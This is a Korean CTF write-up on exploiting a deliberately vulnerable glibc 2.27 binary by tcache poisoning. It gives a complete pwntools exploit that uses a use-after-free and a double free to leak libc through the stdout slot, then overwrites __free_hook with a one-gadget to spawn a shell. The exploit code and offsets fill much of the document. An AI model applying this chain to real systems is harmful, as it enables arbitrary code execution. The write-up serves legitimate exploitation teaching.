# Tcache Poisoning

## 개요

이 문제는 glibc 2.27의 **tcache poisoning** 기법을 이용하는 문제임. tcache는 single-linked list로 free된 청크를 관리하는데, 각 tcache 청크의 첫 8바이트(`tcache_entry->next`)가 다음 청크를 가리키는 포인터임. 이 `next` 포인터를 조작할 수 있으면, tcache가 **다음 malloc 때 임의 주소를 청크로 반환**하게 만들 수 있음(= arbitrary alloc). 이걸 이용해 쓰기 가능한 임의 주소(GOT, `__free_hook`, libc 전역 변수 등)를 할당받아 덮어쓰는 것이 tcache poisoning임.

glibc 2.27이 중요한 이유:

- **safe-linking 없음** — safe-linking은 glibc 2.32부터 도입된 보호 기법으로, `next` 포인터를 `ptr ^ (addr >> 12)`로 mangle해서 저장함. 2.27에는 이게 없어서 `next`에 **원하는 주소를 평문 그대로** 써 넣으면 그대로 다음 malloc 주소가 됨. mangle/demangle 계산이 전혀 필요 없음.
- **double free 검사(tcache key) 우회** — 초기 2.27에는 tcache 전용 double free 방지 로직이 없었으나, 이 문제의 `libc-2.27.so`(Ubuntu 백포트)에는 `tcache_entry->key` 필드 검사가 들어 있음. poc는 이 `key`의 LSB를 `\x00`으로 덮어서 double free 검사를 우회함(아래 설명).

목표는 `__free_hook`을 one-gadget 주소로 덮어쓴 뒤 `free()`를 호출해 셸을 얻는 것임.

## 바이너리 분석

```c
// Compile: gcc -o tcache_poison tcache_poison.c -no-pie -Wl,-z,relro,-z,now
int main() {
  void *chunk = NULL;
  unsigned int size;
  int idx;
  ...
  switch (idx) {
    case 1:  // Allocate
      scanf("%d", &size);
      chunk = malloc(size);
      read(0, chunk, size - 1);
      break;
    case 2:  // Free
      free(chunk);              // <-- chunk 포인터를 NULL로 밀지 않음
      break;
    case 3:  // Print
      printf("Content: %s", chunk);
      break;
    case 4:  // Edit
      read(0, chunk, size - 1); // <-- free 후에도 쓰기 가능 (UAF)
      break;
  }
}
```

보호 기법 (checksec):

| 항목 | 값 |
|---|---|
| Arch | amd64-64-little |
| RELRO | **Full RELRO** (GOT overwrite 불가 → `__free_hook` 노림) |
| Stack Canary | 없음 |
| NX | 활성 |
| PIE | **No PIE** (base `0x400000`, 전역 변수 주소 고정) |
| Stripped | No |

취약점:

- **단일 전역 포인터 `chunk`** — malloc/free/edit/print 모두 가장 최근에 할당한 `chunk` 하나만 다룸. `free(chunk)` 후에도 `chunk`를 NULL로 지우지 않음.
- **Use-After-Free (UAF)** — `case 4(Edit)`가 `free`된 청크에도 `read(0, chunk, size-1)`로 쓰기를 허용함. 즉 free된 tcache 청크의 `next` 포인터를 덮어쓸 수 있음.
- **Double Free** — `free`가 `chunk`를 지우지 않으므로 동일 청크를 두 번 `free`할 수 있음. 2 → tcache에 같은 청크가 두 번 들어감.
- **`size` 재사용** — `size`는 마지막 Allocate 때 값이 유지되므로, Edit은 마지막 할당 크기만큼 쓸 수 있음.

No PIE이므로 바이너리 내 전역 변수 `stdout`(`.bss`의 copy relocation, 주소 `0x601010` 고정)을 leak 발판으로 삼을 수 있음.

## tcache poisoning 핵심 원리

glibc 2.27의 tcache 청크 구조(백포트된 `key` 포함):

```c
typedef struct tcache_entry {
  struct tcache_entry *next;              // +0x00 : 다음 청크 (free list)
  struct tcache_perthread_struct *key;    // +0x08 : double free 탐지용
} tcache_entry;
```

- `tcache_get` (malloc 시): `e = entries[idx]; entries[idx] = e->next;` — 즉 bin의 head를 반환하고, head를 `e->next`로 교체함. 그러므로 **`next`를 임의 주소 X로 조작해 두면, 두 번의 malloc으로 X를 청크로 반환받음**.
- `tcache_put` (free 시): 백포트된 2.27은 `e->key == tcache`면 bin을 순회하며 double free를 탐지함. 그래서 두 번째 free 전에 `key`를 다른 값으로 바꿔야 검사가 통과됨.

이 문제의 double free + UAF write 조합으로 다음을 수행함:

1. 청크 A를 free → `tcache[idx]: A`
2. Edit으로 `next`에 더미 8바이트 + `key` LSB에 `\x00` 기록 → `key != tcache` 성립
3. 다시 free → double free 검사 통과, `tcache[idx]: A -> A` (self loop, count=2)
4. malloc으로 A를 꺼내면서 Edit/read로 A의 `next`에 **목표 주소**를 평문으로 기록
5. malloc을 반복해 목표 주소를 청크로 반환 → 그 주소에 원하는 값 쓰기

safe-linking이 없기 때문에 4단계에서 목표 주소를 **그대로** 적으면 됨(2.32+였다면 `addr ^ (chunk_addr >> 12)`로 mangle 필요).

## GDB로 오프셋/주소 구하기

poc.py에 하드코딩된 값은 아래 네 개이며, 모두 gdb/pwndbg 또는 정적 도구로 유도할 수 있음.

### 1) `e.symbols['stdout']` = `0x601010` (바이너리 전역변수)

바이너리의 `.bss`에 있는 FILE* 전역 포인터 `stdout`. No PIE라서 주소가 고정이고, `read`가 아니라 **copy relocation으로 바이너리에 복사된 8바이트 슬롯**이라 이 슬롯 안에는 libc의 `_IO_2_1_stdout_` 주소가 들어 있음.

```
$ objdump -t tcache_poison | grep -w stdout
0000000000601010 g  O .bss  0000000000000008  stdout@@GLIBC_2.2.5
```

gdb에서는:

```
pwndbg> p &stdout
$1 = (<...> *) 0x601010 <stdout>
pwndbg> x/gx 0x601010        # 이 슬롯이 가리키는 값 = libc의 _IO_2_1_stdout_ 주소
```

### 2) `libc.symbols['_IO_2_1_stdout_']` = `0x3ec760` (libc 오프셋)

leak한 `_IO_2_1_stdout_` 절대주소에서 이 오프셋을 빼면 libc base가 나옴. 유도 방법:

```
$ readelf -s libc-2.27.so | grep _IO_2_1_stdout_
  ... 00000000003ec760 ... _IO_2_1_stdout_
```

또는 gdb에서 `vmmap`으로 libc base를 구한 뒤:

```
pwndbg> vmmap                      # libc 매핑 시작 주소 확인 (= libc_base)
pwndbg> p &_IO_2_1_stdout_         # 절대주소
pwndbg> p (long)&_IO_2_1_stdout_ - libc_base   # => 0x3ec760
```

> **LSB 트릭**: `0x3ec760 & 0xff == 0x60`. libc base는 항상 페이지 정렬(`0x...000`)이므로 `_IO_2_1_stdout_` 절대주소의 **최하위 바이트는 ASLR과 무관하게 항상 `0x60`**. poc가 leak 단계에서 `stdout` 슬롯에 1바이트(`0x60`)만 다시 써 넣어 포인터를 멀쩡하게 유지하는 이유가 이것임.

### 3) `libc.symbols['__free_hook']` = `0x3ed8e8` (libc 오프셋)

최종 overwrite 타깃. Full RELRO라 GOT를 못 건드리므로 libc 내부 함수 포인터인 `__free_hook`을 노림. `free()`는 `__free_hook`이 NULL이 아니면 `__free_hook(ptr)`을 호출함.

```
$ readelf -s libc-2.27.so | grep __free_hook
  ... 00000000003ed8e8 ... __free_hook
```

gdb:

```
pwndbg> p (long)&__free_hook - libc_base   # => 0x3ed8e8
```

### 4) one-gadget `0x4f432` (libc 오프셋)

`__free_hook`에 넣을 값. one_gadget 도구로 libc-2.27.so에서 제약조건을 만족하는 RCE 가젯 오프셋을 뽑음.

```
$ one_gadget libc-2.27.so
0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints: [rsp+0x40] == NULL
...
```

`free(chunk)`가 호출될 때 `rsp+0x40 == NULL` 제약이 맞으면 `execve("/bin/sh")`가 실행됨. 제약을 안 맞으면 다른 one-gadget(`0x4f3ce`, `0x10a41c` 등)으로 교체해 보면 됨.

## 익스플로잇 ( `poc.py` ) 단계별 설명

### 공통 헬퍼

```python
e    = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')

def alloc(size, data):          # case 1 : malloc(size) 후 read로 data 기록
    p.sendlineafter(b'Edit\n', b'1'); p.sendlineafter(b':', str(size).encode()); p.sendafter(b':', data)
def free():                     # case 2 : free(chunk)
    p.sendlineafter(b'Edit\n', b'2')
def print_chunk():              # case 3 : printf("%s", chunk) → leak
    p.sendlineafter(b'Edit\n', b'3')
def edit(data):                 # case 4 : free된 청크에 read (UAF write)
    p.sendlineafter(b'Edit\n', b'4'); p.sendafter(b':', data)
```

> `alloc(0x30, ...)`은 chunk size `0x40`(tcache idx `0x40`), `alloc(0x40, ...)`은 chunk size `0x50`(tcache idx `0x50`)을 다룸 (요청 크기 + 8바이트 size 헤더를 0x10 정렬).

### 1단계: libc leak (tcache[0x40] 조작)

```python
alloc(0x30, b'dreamhack')       # chunk A 할당 (size 0x40)
free()                          # tcache[0x40]: A

edit(b'B'*8 + b'\x00')          # A->next = 'BBBBBBBB', A->key LSB = 0x00 (DF검사 우회)
free()                          # double free → tcache[0x40]: A -> A

addr_stdout = e.symbols['stdout']   # 0x601010
alloc(0x30, p64(addr_stdout))   # A 반환, A->next = 0x601010 → bin: A -> stdout
alloc(0x30, b'BBBBBBBB')        # A 반환 → bin: stdout(0x601010) -> ...
_io_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]   # b'\x60'
alloc(0x30, _io_lsb)            # 0x601010을 청크로 반환받음, 슬롯 LSB=0x60 재기록

print_chunk()                   # printf("%s", 0x601010) → _IO_2_1_stdout_ 절대주소 leak
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
lb = stdout - libc.symbols['_IO_2_1_stdout_']   # libc base
fh = lb + libc.symbols['__free_hook']           # 덮어쓸 타깃
og = lb + 0x4f432                               # one-gadget
```

- `edit(b'B'*8 + b'\x00')`: `next`(8바이트)는 어차피 다음 free 때 덮이므로 더미이고, **9번째 바이트 `\x00`이 `key` 필드의 LSB를 밀어 `key != tcache`를 만들어 double free 검사를 통과**시키는 게 핵심.
- double free로 `tcache[0x40]: A -> A`가 됨.
- `alloc(0x30, p64(0x601010))`: head A를 꺼내며 A의 `next`를 `stdout` 전역(0x601010)으로 조작 → bin head가 다음에 `0x601010`을 내놓도록 poison.
- 두 번째 `alloc`으로 A를 소진하면 bin head = `0x601010`.
- 세 번째 `alloc`은 **`0x601010`(바이너리 `stdout` 슬롯)을 청크로 반환**받음. 이 슬롯에는 `_IO_2_1_stdout_` 주소가 들어 있는데, LSB `0x60`만 다시 써서 포인터를 손상 없이 유지함.
- `print_chunk()`의 `%s`가 `0x601010`이 가리키는 바이트열, 즉 `_IO_2_1_stdout_`의 6바이트 libc 주소를 출력 → leak. 이후 `libc_base`/`__free_hook`/one-gadget 절대주소 계산.

### 2단계: `__free_hook` overwrite (tcache[0x50] 조작)

```python
alloc(0x40, b'dreamhack')       # chunk B 할당 (size 0x50)
free()                          # tcache[0x50]: B

edit(b'C'*8 + b'\x00')          # key LSB=0x00 → DF 검사 우회
free()                          # double free → tcache[0x50]: B -> B

alloc(0x40, p64(fh))            # B 반환, B->next = __free_hook → bin: B -> __free_hook
alloc(0x40, b'D'*8)             # B 소진 → bin: __free_hook
alloc(0x40, p64(og))            # __free_hook을 청크로 반환받아 one-gadget 기록
                                # => __free_hook = one_gadget

free()                          # free(chunk) → __free_hook(chunk) = one_gadget() → shell
p.interactive()
```

1단계와 동일한 double free + poisoning 패턴을 tcache[0x50]에 적용함.

- `alloc(0x40, p64(fh))`로 B의 `next`를 `__free_hook` 주소로 poison.
- `alloc(0x40, b'D'*8)`로 B를 소진하면 bin head = `__free_hook`.
- `alloc(0x40, p64(og))`는 **`__free_hook`을 청크로 반환**받아 one-gadget 주소를 기록 → `__free_hook = one_gadget`.
- 마지막 `free()`에서 glibc가 `__free_hook != NULL`임을 보고 `__free_hook(chunk)`를 호출 → one-gadget 실행 → `execve("/bin/sh")`.

### 단계별 상태

| 단계 | 동작 | 상태 |
|---|---|---|
| 1 | alloc/free A | tcache[0x40]: A |
| 2 | edit(key LSB=0) + free | double free → A -> A |
| 3 | alloc(p64(stdout)) | A->next = 0x601010, bin: A -> stdout |
| 4 | alloc(dummy) | bin head = stdout(0x601010) |
| 5 | alloc(LSB 0x60) | **0x601010을 청크로 반환** (슬롯 포인터 유지) |
| 6 | print | `%s`로 `_IO_2_1_stdout_` leak → libc base |
| 7 | alloc/free B + edit + free | tcache[0x50]: B -> B (double free) |
| 8 | alloc(p64(fh)) | B->next = `__free_hook`, bin: B -> free_hook |
| 9 | alloc(dummy) | bin head = `__free_hook` |
| 10 | alloc(p64(og)) | **`__free_hook`을 반환**받아 one-gadget 기록 |
| 11 | free | `__free_hook(chunk)` 호출 → 셸 |

## 핵심 요약

| 요소 | 내용 |
|---|---|
| 취약점 | 단일 `chunk` 포인터 미초기화 → UAF write + Double Free (Edit이 free된 청크 수정 허용) |
| 기법 | tcache poisoning (`tcache_entry->next` 조작으로 임의 주소 alloc) |
| 2.27 특성 | safe-linking 없음(`next`에 평문 주소), tcache `key` LSB `\x00`으로 double free 검사 우회 |
| leak | `stdout`(0x601010) 슬롯을 alloc으로 반환받아 `%s`로 `_IO_2_1_stdout_` 주소 출력 |
| 보호 우회 | Full RELRO → GOT 대신 libc `__free_hook` 타깃 |
| 고정 주소 | No PIE → `stdout = 0x601010` |
| libc 오프셋 | `_IO_2_1_stdout_ = 0x3ec760`, `__free_hook = 0x3ed8e8`, one-gadget `0x4f432` |
| 최종 목표 | `__free_hook = one_gadget` 후 `free()` 호출 → `execve("/bin/sh")` |

이 문제의 교훈은 safe-linking이 없는 glibc 2.27에서는 `next` 포인터 하나만 평문으로 조작하면 **임의 주소를 malloc으로 반환**받을 수 있다는 점임. UAF/Double Free로 tcache의 free list를 오염시켜 libc 내부 쓰기 가능 영역(`stdout` 슬롯으로 leak, `__free_hook`으로 RCE)을 차례로 장악하는 전형적인 tcache poisoning 흐름임.
